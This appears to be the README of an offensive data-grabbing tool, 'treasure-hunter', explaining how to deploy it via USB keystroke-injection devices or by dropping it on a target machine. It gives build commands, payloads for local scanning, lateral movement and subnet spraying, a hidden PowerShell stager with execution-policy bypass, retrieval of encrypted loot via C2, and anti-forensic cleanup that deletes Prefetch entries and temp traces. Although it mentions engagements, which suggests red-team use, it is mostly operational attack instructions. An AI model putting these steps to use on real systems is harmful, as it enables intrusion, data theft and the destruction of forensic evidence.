# Deployment Payloads

Two deployment modes. Same binary. No manual steps.

## USB Mode (Rubber Ducky / O.MG / Flipper)

**How it works:** Plug in USB. Walk away. Pull out when USB ejects itself.

The `--auto` flag handles everything:
1. Detects it's running from removable drive
2. Runs smash scan with all grabbers
3. Encrypts output to `loot.jsonl.enc` on the USB
4. Cleans Prefetch + PyInstaller temp traces
5. Ejects the USB drive

**Setup:**
1. Build `treasure-hunter.exe` (8.2 MB):
   ```
   pip install pyinstaller
   pyinstaller --onefile --name treasure-hunter --console treasure_hunter/__main__.py
   ```
2. Copy `dist/treasure-hunter.exe` to USB root
3. Flash one of these payloads to your device:

| Payload | What it does |
|---------|-------------|
| `smash-grab.dd` | Local scan only (5 min) |
| `stealth-exfil.dd` | Local + lateral movement (5 hosts) |
| `network-spray.dd` | Triage scan + full subnet spray (30 min) |

**Decrypt results on your machine:**
```
treasure-hunter --decrypt loot.jsonl.enc --passphrase 'CHANGE-ME'
```

## Device Drop Mode (RDP / SMB / Email)

**How it works:** Stage the exe on the target, run `--auto`. Output goes to `%TEMP%`.

```
# On target (any of these work):
treasure-hunter.exe --auto --passphrase 'my-key'

# Or use the stager script:
powershell -w hidden -ep bypass -f stager.ps1
```

Results land at `%TEMP%\th-results.jsonl.enc`. Retrieve via your C2 or access method.

## Important

- **Change the passphrase** from `CHANGE-ME` before every engagement
- The `DELAY` values in DuckyScript are conservative (2s) -- reduce for faster machines
- All payloads assume the exe is named `treasure-hunter.exe` on the USB root
- `--auto` auto-detects USB vs local and adjusts output path accordingly

## Cleanup

`--auto` mode automatically:
- Removes PyInstaller `_MEIxxxxx` temp folders
- Deletes Prefetch entries (if running as admin)
- Ejects USB drive (USB mode only)

For manual cleanup after device drop: run `cleanup.ps1`
